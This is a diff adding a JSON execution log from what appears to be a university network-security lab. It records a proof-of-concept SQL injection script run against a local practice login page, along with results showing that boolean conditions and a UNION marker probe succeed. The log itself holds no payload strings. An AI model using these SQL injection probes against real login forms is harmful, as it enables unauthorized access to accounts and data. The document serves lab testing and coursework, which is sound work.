@@ -1,0 +1,32 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\SQLI-002__1.py",
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-11/",
+    "--valid-user",
+    "Dumb",
+    "--valid-pass",
+    "Dumb"
+  ],
+  "started_at": "2026-10-20T14:42:38+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.166,
+  "stdout": "[baseline_valid] status=200 login_name='Dumb' login_pass='Dumb' flag=True slap=False sql_error=False len=1521\r\n[negative_wrong_pass] status=200 login_name=None login_pass=None flag=False slap=True sql_error=False len=1435\r\n[true_condition] status=200 login_name='Dumb' login_pass='Dumb' flag=True slap=False sql_error=False len=1521\r\n[false_condition] status=200 login_name=None login_pass=None flag=False slap=True sql_error=False len=1435\r\n[union_probe] status=200 login_name='sqli002_marker' login_pass='sqli002_marker' flag=True slap=False sql_error=False len=1541\r\nOBSERVATION: true condition yields a login region while false condition is empty.\r\nOBSERVATION: UNION marker reflected in the login region (column count matched).\r\nNOTE: HTTP 200 or a reflected marker alone is not proof; keep raw responses as evidence.\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "SQLI-002__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\SQLI-002__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-11/",
+    "--valid-user",
+    "Dumb",
+    "--valid-pass",
+    "Dumb"
+  ]
+}
